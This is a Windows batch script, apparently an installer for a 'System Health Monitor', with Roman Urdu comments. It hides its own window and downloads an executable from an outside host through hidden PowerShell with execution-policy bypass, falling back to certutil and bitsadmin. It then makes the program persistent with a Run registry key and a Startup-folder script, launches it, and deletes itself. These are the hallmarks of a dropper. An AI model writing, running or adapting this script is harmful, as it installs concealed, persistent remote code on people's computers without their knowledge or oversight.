@echo off
title System Health Monitor
color 0A

:: Auto minimize
set "MINIMIZE_VBS=%TEMP%\min_win_%RANDOM%.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%MINIMIZE_VBS%"
echo WScript.Sleep 300 >> "%MINIMIZE_VBS%"
echo WshShell.AppActivate "System Health Monitor" >> "%MINIMIZE_VBS%"
echo WshShell.SendKeys "% n" >> "%MINIMIZE_VBS%"
start "" wscript.exe "%MINIMIZE_VBS%"

:: =====================================================
:: CONFIG
:: =====================================================
set "DIR=%APPDATA%\SystemHealthData"
set "EXE=%DIR%\SystemHealthMonitor.exe"
set "URL=https://monitor.smartcrm.pk/monitor/SystemHealthMonitor.exe"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=SystemHealthMonitor"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "LOG=%TEMP%\monitor_install_log.txt"

echo ===================================================== > "%LOG%"
echo INSTALL STARTED %DATE% %TIME% >> "%LOG%"
echo ===================================================== >> "%LOG%"

:: =====================================================
:: STEP 1 - FOLDER BANAO
:: =====================================================
if not exist "%DIR%" mkdir "%DIR%" >> "%LOG%" 2>&1

:: =====================================================
:: STEP 2 - PURANI PROCESS STOP KARO
:: =====================================================
echo Stopping old process... >> "%LOG%"
taskkill /F /IM "SystemHealthMonitor.exe" >> "%LOG%" 2>&1
timeout /t 3 >nul

:: =====================================================
:: STEP 3 - PURANI FILE DELETE KARO
:: =====================================================
if exist "%EXE%" (
    echo Deleting old exe... >> "%LOG%"
    del /F /Q "%EXE%" >> "%LOG%" 2>&1
    timeout /t 2 >nul
)
if exist "%EXE%" (
    powershell -WindowStyle Hidden -Command "Remove-Item -Path '%EXE%' -Force -ErrorAction SilentlyContinue"
    timeout /t 2 >nul
)

:: =====================================================
:: STEP 4 - NAYA VERSION DOWNLOAD
:: =====================================================
echo Downloading... >> "%LOG%"

powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=3072; try{$wc=New-Object System.Net.WebClient; $wc.DownloadFile('%URL%','%EXE%'); exit 0}catch{exit 1}" >> "%LOG%" 2>&1
if exist "%EXE%" goto SUCCESS

powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "try{Invoke-WebRequest '%URL%' -OutFile '%EXE%' -UseBasicParsing; exit 0}catch{exit 1}" >> "%LOG%" 2>&1
if exist "%EXE%" goto SUCCESS

certutil -urlcache -split -f "%URL%" "%EXE%" >> "%LOG%" 2>&1
if exist "%EXE%" goto SUCCESS

bitsadmin /transfer monitorDL /download /priority normal "%URL%" "%EXE%" >> "%LOG%" 2>&1
if exist "%EXE%" goto SUCCESS

echo DOWNLOAD FAILED >> "%LOG%"
goto CLEANUP

:: =====================================================
:: SUCCESS
:: =====================================================
:SUCCESS
echo Download OK >> "%LOG%"

:: Registry mein add
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%EXE%\"" /f >> "%LOG%" 2>&1

:: Startup folder mein backup bat
(
echo @echo off
echo tasklist /FI "IMAGENAME eq SystemHealthMonitor.exe" ^| find /I "SystemHealthMonitor.exe" ^>nul 2^>^&1
echo if errorlevel 1 start "" /B "%EXE%"
echo exit
) > "%STARTUP%\smcrm_svc.bat"

:: Run new version
start "" /B "%EXE%"
echo COMPLETE %DATE% %TIME% >> "%LOG%"

:CLEANUP
if exist "%MINIMIZE_VBS%" del /F /Q "%MINIMIZE_VBS%" >nul 2>&1
(goto) 2>nul & del "%~f0" >nul 2>&1